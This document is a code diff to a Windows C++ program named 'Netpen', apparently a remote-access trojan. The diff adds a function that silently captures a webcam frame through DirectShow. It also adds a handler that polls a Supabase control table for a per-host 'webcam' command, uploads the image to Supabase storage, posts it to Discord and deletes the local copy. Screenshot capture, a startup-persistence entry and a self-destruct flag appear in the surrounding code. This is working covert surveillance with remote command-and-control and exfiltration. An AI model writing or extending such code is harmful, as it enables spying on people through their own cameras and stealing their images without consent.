@@ -5,7 +5,22 @@
 #include <ctime>
 #include <wincrypt.h>
 #include <gdiplus.h>
+#include <dshow.h>
 #include "config.h"
+
+// Missing DirectShow declarations (not available in this mingw version)
+static const CLSID CLSID_SampleGrabber = {0xC1F400A0,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
+static const CLSID CLSID_NullRenderer = {0xC1F400A4,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
+static const IID IID_ISampleGrabber = {0x6B652FFF,0x11FE,0x4fce,{0x92,0xAD,0x02,0x66,0xB5,0xD7,0xC7,0x8F}};
+MIDL_INTERFACE("6B652FFF-11FE-4fce-92AD-0266B5D7C78F")
+ISampleGrabber : public IUnknown {
+    virtual HRESULT STDMETHODCALLTYPE SetOneShot(BOOL) = 0;
+    virtual HRESULT STDMETHODCALLTYPE SetMediaType(const AM_MEDIA_TYPE*) = 0;
+    virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType(AM_MEDIA_TYPE*) = 0;
+    virtual HRESULT STDMETHODCALLTYPE SetBufferSamples(BOOL) = 0;
+    virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer(long*, long*) = 0;
+    virtual HRESULT STDMETHODCALLTYPE GetSample(IMediaSample**) = 0;
+};
 
 #ifndef NETPEN_VERSION
 #define NETPEN_VERSION 0
@@ -517,6 +532,112 @@ static bool CaptureScreen(const char* outputPath) {
     return ok;
 }
 
+static bool CaptureWebcamFrame(const char* outputPath) {
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) return false;
+    bool result = false;
+    IGraphBuilder* pGraph = NULL;
+    ICaptureGraphBuilder2* pBuilder = NULL;
+    IMediaControl* pControl = NULL;
+    IBaseFilter* pCapFilter = NULL;
+    IBaseFilter* pNullFilter = NULL;
+    IBaseFilter* pGrabberBase = NULL;
+    ISampleGrabber* pGrabber = NULL;
+    do {
+        CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);
+        CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuilder);
+        if (!pGraph || !pBuilder) break;
+        pBuilder->SetFiltergraph(pGraph);
+        ICreateDevEnum* pDevEnum = NULL;
+        IEnumMoniker* pEnum = NULL;
+        if (FAILED(CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum))) break;
+        hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
+        pDevEnum->Release();
+        if (FAILED(hr) || !pEnum) break;
+        IMoniker* pMoniker = NULL;
+        if (pEnum->Next(1, &pMoniker, NULL) != S_OK) { pEnum->Release(); break; }
+        pEnum->Release();
+        if (FAILED(pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCapFilter))) { pMoniker->Release(); break; }
+        pMoniker->Release();
+        pGraph->AddFilter(pCapFilter, L"Capture");
+        CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_ISampleGrabber, (void**)&pGrabber);
+        if (!pGrabber) break;
+        if (FAILED(pGrabber->QueryInterface(IID_IBaseFilter, (void**)&pGrabberBase))) break;
+        AM_MEDIA_TYPE mt;
+        ZeroMemory(&mt, sizeof(mt));
+        mt.majortype = MEDIATYPE_Video;
+        mt.subtype = MEDIASUBTYPE_RGB24;
+        pGrabber->SetMediaType(&mt);
+        pGraph->AddFilter(pGrabberBase, L"Grabber");
+        CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullFilter);
+        if (pNullFilter) pGraph->AddFilter(pNullFilter, L"Null");
+        if (FAILED(pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCapFilter, pGrabberBase, pNullFilter))) break;
+        pGrabber->SetOneShot(TRUE);
+        pGrabber->SetBufferSamples(TRUE);
+        if (FAILED(pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl))) break;
+        if (FAILED(pControl->Run())) break;
+        DWORD waitStart = GetTickCount();
+        bool gotSample = false;
+        while (GetTickCount() - waitStart < 5000) {
+            OAFilterState state;
+            pControl->GetState(10, &state);
+            if (state == State_Running) { Sleep(300); long cb = 0; if (pGrabber->GetCurrentBuffer(&cb, NULL) == S_OK) { gotSample = true; break; } }
+            Sleep(100);
+        }
+        if (!gotSample) break;
+        long cbBuffer = 0;
+        if (FAILED(pGrabber->GetCurrentBuffer(&cbBuffer, NULL))) break;
+        BYTE* pBuffer = new BYTE[cbBuffer];
+        if (FAILED(pGrabber->GetCurrentBuffer(&cbBuffer, (long*)pBuffer))) { delete[] pBuffer; break; }
+        AM_MEDIA_TYPE actualMt;
+        ZeroMemory(&actualMt, sizeof(actualMt));
+        if (FAILED(pGrabber->GetConnectedMediaType(&actualMt))) { delete[] pBuffer; break; }
+        VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)actualMt.pbFormat;
+        if (actualMt.formattype == FORMAT_VideoInfo && actualMt.cbFormat >= sizeof(VIDEOINFOHEADER) && vih) {
+            LONG w = vih->bmiHeader.biWidth;
+            LONG h = abs(vih->bmiHeader.biHeight);
+            BITMAPINFO bmi;
+            ZeroMemory(&bmi, sizeof(bmi));
+            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+            bmi.bmiHeader.biWidth = w;
+            bmi.bmiHeader.biHeight = -h;
+            bmi.bmiHeader.biPlanes = 1;
+            bmi.bmiHeader.biBitCount = 24;
+            bmi.bmiHeader.biCompression = BI_RGB;
+            HDC hdc = GetDC(NULL);
+            HBITMAP hBmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, NULL, NULL, 0);
+            if (hBmp) {
+                SetBitmapBits(hBmp, cbBuffer, pBuffer);
+                Gdiplus::Bitmap bitmap(hBmp, NULL);
+                CLSID clsid;
+                if (GetEncoderClsid(L"image/jpeg", &clsid) >= 0) {
+                    Gdiplus::EncoderParameters eps;
+                    eps.Count = 1;
+                    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
+                    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+                    eps.Parameter[0].NumberOfValues = 1;
+                    UINT q = 80;
+                    eps.Parameter[0].Value = &q;
+                    result = (bitmap.Save(ToWide(outputPath).c_str(), &clsid, &eps) == Gdiplus::Ok);
+                }
+                DeleteObject(hBmp);
+            }
+            ReleaseDC(NULL, hdc);
+        }
+        if (actualMt.pbFormat) CoTaskMemFree(actualMt.pbFormat);
+        delete[] pBuffer;
+    } while (false);
+    if (pControl) { pControl->Stop(); pControl->Release(); }
+    if (pGrabberBase) pGrabberBase->Release();
+    if (pGrabber) pGrabber->Release();
+    if (pNullFilter) pNullFilter->Release();
+    if (pCapFilter) pCapFilter->Release();
+    if (pBuilder) pBuilder->Release();
+    if (pGraph) pGraph->Release();
+    CoUninitialize();
+    return result;
+}
+
 static std::string GetScreenshotTimestamp() {
     time_t now = time(NULL);
     struct tm* tm = gmtime(&now);
@@ -598,6 +719,48 @@ static void HandleScreenshot(const std::string& rowId) {
 
     DeleteFileA(localFile.c_str());
     LogMsg("Screenshot done: " + resultUrl);
+}
+
+static std::string CheckWebcamCmd() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.webcam&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
+    size_t p = resp.find("\"id\":");
+    if (p == std::string::npos) return "";
+    p += 5;
+    size_t e = resp.find_first_of("},]", p);
+    if (e == std::string::npos) return "";
+    return resp.substr(p, e - p);
+}
+
+static void HandleWebcam(const std::string& rowId) {
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    std::string ts = GetScreenshotTimestamp();
+    std::string localFile = std::string(tmp) + "NetpenCam_" + g_hostname + "_" + ts + ".jpg";
+    std::string storageFile = "webcam/" + g_hostname + "_" + ts + ".jpg";
+
+    if (!CaptureWebcamFrame(localFile.c_str())) { LogMsg("Webcam: capture failed"); return; }
+    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
+    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
+        LogMsg("Webcam: upload failed");
+        DeleteFileA(localFile.c_str());
+        return;
+    }
+
+    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
+    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    std::string resp;
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+
+    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
+    PostDiscordImage(host, "Netpen \u2014 " + host + " Webcam", resultUrl, "");
+
+    DeleteFileA(localFile.c_str());
+    LogMsg("Webcam done: " + resultUrl);
 }
 
 static void FetchTriggers() {
@@ -883,6 +1046,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 FetchTriggers();
                 std::string scRowId = CheckScreenshotCmd();
                 if (!scRowId.empty()) HandleScreenshot(scRowId);
+                std::string wcRowId = CheckWebcamCmd();
+                if (!wcRowId.empty()) HandleWebcam(wcRowId);
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
